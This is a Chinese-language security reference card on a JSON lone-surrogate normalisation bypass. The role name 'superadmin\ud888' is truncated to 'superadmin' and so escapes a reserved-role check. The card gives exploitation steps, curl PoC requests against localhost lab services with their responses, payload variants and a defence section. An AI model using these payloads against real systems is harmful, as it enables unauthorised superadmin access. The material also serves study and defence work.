---
id: web-generic-auth-json-invalid-unicode-surrogate-role-truncation
title: JSON 非法 Unicode 代理项截断：superadmin\ud888 角色名归一化绕过内部角色限制提权
type: scenario
domain: web
path: web/generic/auth
technique: json-invalid-unicode-surrogate-role-normalization
aliases:
- lone surrogate JSON
- 孤立代理项
- \ud888 角色绕过
- superadmin\ud888
- 无效 Unicode 截断
- Python2 JSON 截断
- ujson surrogate
- 角色名归一化差异
tags:
- web
- auth
- json
- unicode
- surrogate
- parser-differential
- privilege-escalation
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-08T00:32:19+08:00'
  notes: 已对照原文与14张图：图05 Python2.7+ujson 对 test\ud800 截断后 last-wins 得 {u"test":2}，图06 Python3.8+ujson 两键并存；图08 分配 superadmin 被拒、图09 simple 角色成功、图10 创建 superadmin\ud888 成功、图11 权限返回该角色、图12 /admin 返回 Superadmin Access granted，与卡内步骤一致。未本机复跑；原文未给组件版本，未设 affected_versions。dup-scan 本组无该卡 pair；dedup 仅自身 duplicate，top related 为 WAF unicode 转义链（sink/触发不同）。
---

## 一句话结论

当 JSON 中的角色/身份字符串包含非法 Unicode 代理项（如 `superadmin\ud888`）时，不同解析器对孤立 surrogate 的处理不同：Python2/ujson 等在编码或转换时会截断或替换成 `?`，使 `superadmin\ud888` 归一化为 `superadmin`；应用若用“禁止创建 superadmin 内部角色”的黑名单校验原始字符串、却在另一处用归一化后的字符串做权限判断，攻击者就能创建并分配 `superadmin\ud888`，获得超级管理员权限。

## 原理

- JSON 的 `\uXXXX` 转义允许写任意 16 位码元；RFC 8259 要求字符串是合法 Unicode，但并未强制解析器拒绝孤立 surrogate（`\ud800`~`\udfff` 未成对出现）。不同实现的行为不一致：有的保留孤立 surrogate，有的替换成 U+FFFD 或 `?`，有的在转 UTF-8 时截断，有的直接报错。
- Python2 的 `unicode.encode("utf-8")` 遇到孤立 surrogate 会将其变成 `?`（或截断），因此 `superadmin\ud888` 在进入字符串比较/数据库编码时可能变成 `superadmin`；Python3 对孤立 surrogate 编码会抛 `UnicodeEncodeError`，但 `json`/`ujson` 可以把它保留成独立字符串，于是同一文档在 Python2 和 Python3 下解析成不同键。
- 实验复现：Python2.7 + ujson 对 `ujson.loads('{"test": 1, "test\\ud800": 2}')` 得到 `{u'test': 2}`——`test\ud800` 被截断成 `test`，与前面的 `test` 冲突，last-wins 取 2；Python3.8 + ujson 得到 `{'test': 1, 'test\ud800': 2}`——两个键并存，不冲突。
- 在 lab2 中，应用禁止把内部角色 `superadmin` 分配给用户（直接提交 `superadmin` 会返回 `Assignment of internal role 'superadmin' is forbidden`），但允许创建名为 `superadmin\ud888` 的角色并分配给用户；权限服务在比较角色名时走的是会截断孤立 surrogate 的路径，于是 `superadmin\ud888` 被归一化成 `superadmin`，用户获得超级管理员权限。
- 根因与重复键差异相同：安全校验和权限使用不是在同一份规范化字符串上完成。校验时看原始转义字符串（或另一个解析器），鉴权时看归一化后的字符串，二者不一致。

## 触发条件

- JSON 解析/编码链路中存在处理孤立 surrogate 差异的组件（Python2、ujson、部分 C++/Java 库、数据库/驱动编码层）。
- 角色名、用户名、权限标识等安全敏感字符串来自 JSON，并经过“校验 → 存储 → 归一化比较”多次转换。
- 保留名/黑名单检查发生在归一化之前，或只检查原始字符串；权限判断发生在归一化之后。
- 攻击者能访问角色/用户创建与角色分配接口（通常是管理后台或注册接口）。

## 利用步骤

1. 探测应用是否接受 `\uXXXX` 转义与非法 surrogate：提交带 `\ud800`~`\udfff` 的角色/用户名，观察创建响应、查询接口、数据库/日志中的值是保留、变成 `?`、消失还是报错。
2. 确认保留角色校验：直接创建或分配 `superadmin`，记录拒绝信息（如 `Assignment of internal role 'superadmin' is forbidden`）。
3. 创建变体角色：提交 `{"name":"superadmin\ud888"}`；若成功，响应/查询可能显示 `superadmin\ud888` 或已被截断。
4. 创建用户并分配该角色：`{"user":"exampleUser","roles":["superadmin\ud888"]}`。
5. 查询该用户权限，确认角色存储值与归一化结果；用该用户访问管理员接口或高权限 API。
6. 若未成功，遍历不同 surrogate（`\ud800`~`\udfff`）、双写、大小写、控制字符（`\x0d`）、反斜杠/引号截断，以及 UTF-8/UTF-16/GBK 不同编码路径。

## PoC

```bash
# 1) 直接创建/分配内部角色 superadmin 被拒绝
curl localhost:5002/user/create -H "Content-Type: application/json" -d @user3.json
# {"Error":"Assignment of internal role 'superadmin' is forbidden"}

# 2) 创建带非法 surrogate 的角色
cat role2.json
{"name": "superadmin\ud888"}
curl localhost:5002/role/create -H "Content-Type: application/json" -d @role2.json
# {"OK":"Created role 'superadmin\\ud888'"}

# 3) 创建用户并分配该角色
cat user2.json
{"user": "exampleUser", "roles": ["superadmin\ud888"]}
curl localhost:5002/user/create -H "Content-Type: application/json" -d @user2.json
# {"OK":"Created user 'exampleUser'"}

# 4) 查询权限（存储值可能仍显示转义形式）
curl localhost:5003/permissions/exampleUser
# {"roles":["superadmin\\ud888"]}

# 5) 以该用户访问管理员接口
curl localhost:5004/admin -H "Cookie: username=exampleUser"
# {"OK":"Superadmin Access granted"}
```

Python2/Python3 差异验证：

```python
# Python 2.7 + ujson：孤立 surrogate 被截断，键冲突后 last-wins
ujson.loads('{"test": 1, "test\\ud800": 2}')   # {u'test': 2}

# Python 3.8 + ujson：两个键并存，不冲突
ujson.loads('{"test": 1, "test\\ud800": 2}')   # {'test': 1, 'test\ud800': 2}
```

## 变体与关联

- 字符截断类 payload：`{"test": 1, "test\[raw \x0d byte]": 2}`、`{"test": 1, "test\ud800": 2}`、`{"test": 1, "test"": 2}`、`{"test": 1, "te\st": 2}`——解析器可能在特殊字符处截断，使后一个键与前一个键碰撞。
- 注释截断：`{"description":"Duplicate with comments","test":2,"extra":/*,"test":1,"extra2":*/}` 在 GoJay 中 `test=2`，在 Java JSON-iterator 中 `test=1` 且 `extra="/*"`，GSON 丢弃注释尾部，simdjson 保留 `extra2` 且 `test=2`。这类差异可制造角色/参数键碰撞，但原文只给解析结果、无端到端目标，未单独成卡。
- 重复键/大数解析差异（业务逻辑绕过）见 [[web-generic-json-duplicate-key-big-number-parser-differential]]。
- 同类 CVE 思路：CouchDB CVE-2017-12635 用重复 `roles` 键绕过管理员创建限制，见 [[web-generic-rce-couchdb-cve-2017-12635-12636]]。
- HTTP 重复参数导致鉴权/取数不一致的类似思路见 [[web-generic-auth-hpp-duplicate-param-auth-data-mismatch]]；本卡差异发生在 JSON Unicode 层而非 HTTP 参数层。

## 检测与防御

- 字符串合法性：在 JSON 解析后强制校验 Unicode 合法性，拒绝孤立 surrogate（Python 编码用 `errors="strict"`；Java `CharsetDecoder` 用 `REPORT`；Go `utf8.Valid`）；统一转为 UTF-8 后再进入业务。
- 规范化后再做安全判断：对角色名/用户名做 NFC 归一化、大小写与不可见字符处理，然后在同一规范化形式上完成保留名校验、存储与鉴权；禁止“校验原始串、鉴权用归一化串”。
- 角色标识改用不可伪造的 ID：授权判断使用 role_id 而非 role_name；保留角色用白名单 ID，禁止按名称匹配。
- 解析/编码路径统一：安全边界上避免 Python2/legacy ujson 等旧组件；升级 JSON 库并做互操作测试。
- 监控：请求体中出现 `\uD800`~`\uDFFF`、控制字符、反斜杠/引号截断的角色/用户字段；创建的角色名与保留角色归一化后相同、但原始字节不同的告警。
